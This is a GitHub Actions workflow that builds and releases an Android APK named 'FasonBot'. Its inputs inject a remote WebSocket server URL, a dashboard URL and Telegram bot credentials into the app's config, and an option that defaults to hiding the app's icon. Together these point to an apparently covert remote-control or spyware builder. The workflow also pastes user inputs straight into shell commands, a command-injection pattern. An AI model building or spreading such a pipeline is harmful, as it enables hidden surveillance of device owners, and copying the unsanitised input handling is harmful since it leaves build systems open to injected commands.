name: Build Android APK

on:
  push:
    branches: [main]
    paths: ['app/**']
  pull_request:
    branches: [main]
    paths: ['app/**']
  workflow_dispatch:
    inputs:
      build_type:
        description: 'Build type'
        required: true
        default: 'debug'
        type: choice
        options: ['debug', 'release', 'both']
      app_name:
        description: 'App name (optional)'
        required: false
        default: ''
        type: string
      auto_hide_icon:
        description: 'Auto-hide app icon'
        required: true
        default: 'yes'
        type: choice
        options: ['yes', 'no']
      create_release:
        description: 'Create release?'
        required: true
        default: 'no'
        type: choice
        options: ['yes', 'no']
      custom_version:
        description: 'Version tag (optional)'
        required: false
        default: ''
        type: string
      prerelease:
        description: 'Pre-release?'
        required: true
        default: 'no'
        type: choice
        options: ['yes', 'no']
      server_url:
        description: 'WebSocket URL  e.g. wss://xxxx.pike.replit.dev/ws'
        required: false
        default: ''
        type: string
      dashboard_url:
        description: 'Dashboard web URL  e.g. https://xxxx.pike.replit.dev'
        required: false
        default: ''
        type: string
      bot_token:
        description: 'Bot Token (optional, legacy)'
        required: false
        default: ''
        type: string
      chat_id:
        description: 'Chat ID (optional, legacy)'
        required: false
        default: ''
        type: string

permissions:
  contents: write

jobs:
  build:
    runs-on: ubuntu-latest
    env:
      FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: true
      BUILD_TYPE: ${{ github.event.inputs.build_type || 'debug' }}
      CREATE_RELEASE: ${{ github.event.inputs.create_release || 'no' }}
      IS_PRERELEASE: ${{ github.event.inputs.prerelease || 'no' }}
      APP_NAME: ${{ github.event.inputs.app_name }}
      AUTO_HIDE_ICON: ${{ github.event.inputs.auto_hide_icon || 'yes' }}

    steps:
      - uses: actions/checkout@v4
        with:
          persist-credentials: true

      - name: Get Version
        id: version
        run: |
          GRADLE="./app/build.gradle"
          V_NAME=$(grep "versionName" "$GRADLE" | sed 's/.*versionName[ =]*"\{0,1\}//;s/"//g')
          V_CODE=$(grep "versionCode" "$GRADLE" | sed 's/.*versionCode[ =]*//')
          [ -n "${{ github.event.inputs.custom_version }}" ] && V_NAME="${{ github.event.inputs.custom_version }}"
          [ -z "$V_NAME" ] && V_NAME="1.0.0-$(git rev-parse --short HEAD)"
          echo "name=$V_NAME" >> $GITHUB_OUTPUT
          echo "code=$V_CODE" >> $GITHUB_OUTPUT

      - name: Set App Name
        if: env.APP_NAME != ''
        run: |
          FILE="./app/src/main/res/values/strings.xml"
          sed -i "s|<string name=\"app_name\">.*</string>|<string name=\"app_name\">$APP_NAME</string>|" "$FILE"

      - name: Set Server URL
        run: |
          FILE="./app/src/main/java/com/fasonbot/app/config/BotConfig.kt"
          URL="${{ github.event.inputs.server_url }}"
          if [ -n "$URL" ]; then
            sed -i "s|private const val SERVER_URL = \".*\"|private const val SERVER_URL = \"$URL\"|" "$FILE"
            echo "WebSocket URL set to: $URL"
          else
            echo "No WebSocket URL provided, using hardcoded value"
          fi

      - name: Set Dashboard URL
        run: |
          FILE="./app/src/main/java/com/fasonbot/app/config/BotConfig.kt"
          DURL="${{ github.event.inputs.dashboard_url }}"
          if [ -n "$DURL" ]; then
            sed -i "s|private const val DASHBOARD_URL = \".*\"|private const val DASHBOARD_URL = \"$DURL\"|" "$FILE"
            echo "Dashboard URL set to: $DURL"
          else
            echo "No Dashboard URL provided, using hardcoded value"
          fi

      - name: Set Bot Credentials
        env:
          INPUT_TOKEN: ${{ github.event.inputs.bot_token }}
          INPUT_ID: ${{ github.event.inputs.chat_id }}
          SECRET_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          SECRET_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
        run: |
          TOKEN="${INPUT_TOKEN:-$SECRET_TOKEN}"
          CHAT="${INPUT_ID:-$SECRET_ID}"

          if [ "$AUTO_HIDE_ICON" = "yes" ]; then
            HIDE_ICON="true"
          else
            HIDE_ICON="false"
          fi

          FILE="./app/src/main/java/com/fasonbot/app/config/BotConfig.kt"

          sed -i "s|private const val AUTO_HIDE_ICON = .*|private const val AUTO_HIDE_ICON = $HIDE_ICON|" "$FILE"

          if [ -z "$TOKEN" ] || [ -z "$CHAT" ]; then
            echo "No credentials provided - using hardcoded defaults"
            exit 0
          fi

          echo "Injecting credentials..."

          sed -i "s|private const val BOT_TOKEN = \".*\"|private const val BOT_TOKEN = \"$TOKEN\"|" "$FILE"
          sed -i "s|private const val CHAT_ID = \".*\"|private const val CHAT_ID = \"$CHAT\"|" "$FILE"

          echo "Credentials injected successfully (autoHideIcon: $HIDE_ICON)"

      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: 17
          cache: gradle

      - name: Setup Gradle
        run: chmod +x gradlew

      - name: Setup Signing
        if: env.BUILD_TYPE == 'release' || env.BUILD_TYPE == 'both'
        env:
          KEYSTORE_BASE64: ${{ secrets.KEYSTORE_BASE64 }}
          KEYSTORE_PASSWORD: ${{ secrets.KEYSTORE_PASSWORD }}
          KEY_ALIAS: ${{ secrets.KEY_ALIAS }}
          KEY_PASSWORD: ${{ secrets.KEY_PASSWORD }}
        run: |
          echo "Checking signing configuration..."

          if [ -n "$KEYSTORE_BASE64" ] && [ -n "$KEYSTORE_PASSWORD" ] && [ -n "$KEY_ALIAS" ] && [ -n "$KEY_PASSWORD" ]; then
            echo "Using GitHub secrets for signing..."
            echo "$KEYSTORE_BASE64" | base64 -d > release.keystore
            echo "storeFile=../release.keystore" > keystore.properties
            echo "storePassword=$KEYSTORE_PASSWORD" >> keystore.properties
            echo "keyAlias=$KEY_ALIAS" >> keystore.properties
            echo "keyPassword=$KEY_PASSWORD" >> keystore.properties
            echo "Signing configured from GitHub secrets"
          elif [ -f "release.keystore" ] && [ -f "keystore.properties" ]; then
            echo "Using local keystore files from repository..."
            echo "Local keystore found and will be used"
          else
            echo "No keystore configuration found"
            echo "Release build will be UNSIGNED"
            rm -f keystore.properties
          fi

          if [ -f "keystore.properties" ] && [ -f "release.keystore" ]; then
            echo "SIGNING_ENABLED=true" >> $GITHUB_ENV
            echo "SIGNING_STATUS=signed" >> $GITHUB_OUTPUT
            echo "Signing is CONFIGURED"
          else
            echo "SIGNING_ENABLED=false" >> $GITHUB_ENV
            echo "SIGNING_STATUS=unsigned" >> $GITHUB_OUTPUT
            echo "Signing is NOT configured - release will be UNSIGNED"
          fi

      - name: Build
        run: |
          case "$BUILD_TYPE" in
            debug) ./gradlew assembleDebug ;;
            release) ./gradlew assembleRelease ;;
            both) ./gradlew assembleDebug assembleRelease ;;
          esac

      - name: Package APKs
        id: apk
        run: |
          VER="${{ steps.version.outputs.name }}"
          NAME="${APP_NAME:-FasonBot}"

          if [ "$BUILD_TYPE" = "debug" ] || [ "$BUILD_TYPE" = "both" ]; then
            APK=$(find ./app -name "*debug*.apk" | head -n1)
            [ -n "$APK" ] && cp "$APK" "${NAME}-v${VER}-debug.apk" && echo "debug=${NAME}-v${VER}-debug.apk" >> $GITHUB_OUTPUT
          fi

          if [ "$BUILD_TYPE" = "release" ] || [ "$BUILD_TYPE" = "both" ]; then
            APK=$(find ./app -name "*release*.apk" | head -n1)
            if [ -n "$APK" ]; then
              if [ "$SIGNING_ENABLED" = "true" ]; then
                cp "$APK" "${NAME}-v${VER}-release-signed.apk"
                echo "release=${NAME}-v${VER}-release-signed.apk" >> $GITHUB_OUTPUT
              else
                cp "$APK" "${NAME}-v${VER}-release-unsigned.apk"
                echo "release=${NAME}-v${VER}-release-unsigned.apk" >> $GITHUB_OUTPUT
              fi
            fi
          fi

      - name: Upload APKs To Repository Root
        if: ${{ steps.apk.outputs.debug != '' || steps.apk.outputs.release != '' }}
        run: |
          git config --global user.name "github-actions"
          git config --global user.email "github-actions@github.com"
          git add *.apk
          git commit -m "Auto upload built APKs [skip ci]" || echo "No changes to commit"
          git push

      - name: Release
        if: github.ref == 'refs/heads/main' && (github.event_name == 'push' || (github.event_name == 'workflow_dispatch' && env.CREATE_RELEASE == 'yes'))
        uses: softprops/action-gh-release@v1
        with:
          tag_name: v${{ steps.version.outputs.name }}
          name: ${{ env.APP_NAME || 'FasonBot' }} v${{ steps.version.outputs.name }}
          files: |
            ${{ steps.apk.outputs.debug }}
            ${{ steps.apk.outputs.release }}
          prerelease: ${{ env.IS_PRERELEASE == 'yes' }}
          generate_release_notes: true
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      - name: Summary
        run: |
          echo "## Build Complete" >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY
          echo "- **App:** ${APP_NAME:-FasonBot}" >> $GITHUB_STEP_SUMMARY
          echo "- **Version:** ${{ steps.version.outputs.name }}" >> $GITHUB_STEP_SUMMARY
          echo "- **Type:** $BUILD_TYPE" >> $GITHUB_STEP_SUMMARY
          echo "- **Auto-hide icon:** $AUTO_HIDE_ICON" >> $GITHUB_STEP_SUMMARY
          if [ "$BUILD_TYPE" = "release" ] || [ "$BUILD_TYPE" = "both" ]; then
            if [ "$SIGNING_ENABLED" = "true" ]; then
              echo "- **Signing:** Signed" >> $GITHUB_STEP_SUMMARY
            else
              echo "- **Signing:** Unsigned" >> $GITHUB_STEP_SUMMARY
            fi
          fi
